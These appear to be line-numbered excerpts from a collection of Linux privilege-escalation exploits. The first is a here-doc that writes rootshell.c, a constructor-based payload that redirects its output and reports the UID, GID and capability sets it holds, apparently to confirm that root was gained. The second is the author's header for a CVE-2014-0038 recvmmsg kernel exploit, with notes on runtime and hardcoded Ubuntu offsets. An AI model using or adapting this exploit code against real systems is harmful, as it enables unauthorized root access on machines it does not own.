15865  cat > rootshell.c << "EOF"
15866  #define _GNU_SOURCE
15867  #include <linux/capability.h>
15868  #include <stdio.h>
15869  #include <stdlib.h>
15870  #include <sys/types.h>
15871  #include <unistd.h>
15872  #define die() exit(__LINE__)
15873  static void __attribute__ ((constructor)) status(void) {
15874      if (dup2(STDIN_FILENO, STDOUT_FILENO) != STDOUT_FILENO) die();
15875      if (dup2(STDIN_FILENO, STDERR_FILENO) != STDERR_FILENO) die();
15876      const pid_t pid = getpid();
15877      if (pid <= 0) die();
15878      printf("Pid:\t%zu\n", (size_t)pid);
15879      uid_t ruid, euid, suid;
15880      gid_t rgid, egid, sgid;
15881      if (getresuid(&ruid, &euid, &suid)) die();
15882      if (getresgid(&rgid, &egid, &sgid)) die();
15883      printf("Uid:\t%zu\t%zu\t%zu\n", (size_t)ruid, (size_t)euid, (size_t)suid);
15884      printf("Gid:\t%zu\t%zu\t%zu\n", (size_t)rgid, (size_t)egid, (size_t)sgid);
15885      static struct __user_cap_header_struct header;
15886      if (capget(&header, NULL)) die();
15887      if (header.version <= 0) die();
15888      header.pid = pid;
15889      static struct __user_cap_data_struct data[2];
15890      if (capget(&header, data)) die();
15891      printf("CapInh:\t%08x%08x\n", data[1].inheritable, data[0].inheritable);
15892      printf("CapPrm:\t%08x%08x\n", data[1].permitted, data[0].permitted);
15893      printf("CapEff:\t%08x%08x\n", data[1].effective, data[0].effective);
15894      fflush(stdout);
15895      for (;;) sleep(10);
15896      die();
15897  }
15898  EOF

19794  CVE-2014-0038 / x32 ABI with recvmmsg
19795  by rebel @ irc.smashthestack.org
19796  -----------------------------------
19797  takes about 13 minutes to run because timeout->tv_sec is decremented
19798  once per second and 0xff*3 is 765.

19801  but that would require a bunch of nulls before the pointer and then
19802  reading an oops from dmesg which isn't that elegant.

19804  hardcoded offsets because I only saw this on ubuntu & kallsyms is protected
